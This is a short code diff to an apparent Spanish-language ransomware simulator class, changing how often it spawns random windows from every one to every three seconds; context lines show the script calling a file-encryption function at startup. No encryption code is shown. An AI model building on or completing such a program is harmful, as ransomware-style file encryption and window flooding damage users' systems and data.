@@ -89,7 +89,7 @@ class RansomwareSimulador:
 
     def generar_ventanas(self):
         crear_ventana_aleatoria()
-        self.root.after(1000, self.generar_ventanas)
+        self.root.after(3000, self.generar_ventanas)
 
 if __name__ == "__main__":
     cifrar_archivos()
